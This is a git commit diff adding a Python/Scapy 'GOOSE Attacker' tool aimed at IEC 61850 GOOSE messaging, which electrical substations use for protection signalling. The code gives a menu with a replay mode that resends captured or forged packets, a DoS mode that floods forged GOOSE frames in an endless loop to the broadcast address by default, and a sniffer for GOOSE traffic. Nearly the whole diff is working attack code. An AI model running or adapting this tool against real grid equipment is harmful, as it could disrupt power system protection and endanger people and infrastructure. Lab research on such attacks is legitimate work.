1b3149144609bb76cebc17a1fe2bded8d557bbaa
odabasi52 <ordulubaba0034@gmail.com>
2023-11-19 19:46:54 +0300

    GOOSE Attacker

--- goose_attacker/goose_lib/goose_attacker.py
+++ goose_attacker/goose_lib/goose_attacker.py
@@ -1,13 +1,68 @@
 from goose_lib.goose import GOOSE
 import scapy.all as scp
+import time
 
 class Attacker:
     def __init__(self,src_mac, dst_mac):
         self.src_mac = src_mac
         self.dst_mac = dst_mac
-        pass
     
-    def send_packet(self, msg):
+    def replay_mode(self, msg):  	
+        print("\033[2J\033[;H", end='')
+        print(" ________________________________")
+        print("|                                |")
+        print("|           GOOSE Replay         |")
+        print("|________________________________|\n")
+        print("[1] PCAP sender\n[2] Message sender")
+        choise = int(input("Your choise: "))
+        match choise:
+            case 1:
+                path = input("PCAP path: ")
+                try:
+                    pcap = scp.rdpcap(path)
+                    scp.sendp(pcap)
+                except FileNotFoundError:
+                    print("File is not valid") 
+            case 2:     
+                count = int(input("How many packets: "))
+                pack = self.create_pack(msg)
+                for _ in range(count):
+                    scp.sendp(pack)
+                    time.sleep(0.2)
+    
+    def dos_mode(self, msg):	
+        print("\033[2J\033[;H", end='')
+        print(" ________________________________")
+        print("|                                |")
+        print("|            GOOSE DoS           |")
+        print("|________________________________|\n(^C) to exit after starting")
+        length = int(input("Packets per send: "))
+        ms = float(input("Frequency: "))
+        msgs = [self.create_pack(msg) for _ in range(length)]
+        add = 0
+        while True:
+            scp.sendp(msgs)
+            time.sleep(1/ms)
+            add += length
+            
+    def listener_mode(self):
+        print("\033[2J\033[;H", end='')
+        print(" ________________________________")
+        print("|                                |")
+        print("|          GOOSE Listener        |")
+        print("|________________________________|\n(^C) to exit after starting")
+        print("\n[1] Yes\n[2] No")
+        choise = input("Do you want to save traffic: ")
+
+        match choise:
+            case "1":
+                name = input("Name of the file: ")
+                pack = scp.sniff(prn=lambda x:x.show(), store=1, filter="ether proto 0x88b8")
+                scp.wrpcap(name, pack)
+            case "2":
+                scp.sniff(prn=lambda x:x.show(), store=0, filter="ether proto 0x88b8")
+
+    def create_pack(self, msg):
         goose = GOOSE(
             appId=msg["appId"], 
             gocbRef=msg["gocbRef"],
@@ -25,4 +80,4 @@ class Attacker:
         ether_layer = scp.Ether(src=self.src_mac, dst=self.dst_mac,  type=0x88b8)
         data = scp.Raw(load=goose.generate_msg())
         packet = ether_layer/data
-        scp.sendp(packet)
+        return (packet)
--- goose_attacker/main.py
+++ goose_attacker/main.py
@@ -1,7 +1,6 @@
-from goose_lib.goose_attacker import Attacker
+from goose_lib.goose_attacker import Attacker, time
 import argparse
 from uuid import getnode
-import time
 
 goose_msg = {
     "appId"                 : 1,
@@ -21,14 +20,30 @@ goose_msg = {
     #b"\x83\x01\x00\x84\x03\x03\x00\x00\x83\x01\x00\x84\x03\x03\x00\x00\x83\x01\x00\x84\x03\x03\x00\x00\x83\x01\x00\x84\x03\x03\x00\x00"
 }
 
-def get_src_mac():
-        return (':'.join(['{:02x}'.format((getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1]))
+def main():
+    goose_attacker = Attacker(args.src, args.dst)	
+    print("\033[2J\033[;H", end='')
+    print(" ________________________________")
+    print("|                                |")
+    print("|    Welcome To GOOSE Attacker   |")
+    print("|________________________________|\nPlease modify GOOSE msg from main.py\n")
+    print("[1] GOOSE Replay Attack\n[2] GOOSE DoS\n[3] GOOSE Listener")
+    choise = input("You choise: ")
+    match choise:
+        case "1":
+            goose_attacker.replay_mode(goose_msg)
+        case "2":
+            goose_attacker.dos_mode(goose_msg)
+        case "3":
+            goose_attacker.listener_mode()
 
 if __name__ == "__main__":
+    def get_src_mac():
+        return (':'.join(['{:02x}'.format((getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1]))
+
     parser = argparse.ArgumentParser(description="GOOSE Attacker")
     parser.add_argument('-s', '--src', help="source MAC",required=False, default=get_src_mac())
     parser.add_argument('-d', '--dst', help="destination MAC",required=False, default="ff:ff:ff:ff:ff:ff")
     args = parser.parse_args()
     
-    goose_attacker = Attacker(args.src, args.dst)
-    goose_attacker.send_packet(goose_msg)
+    main()
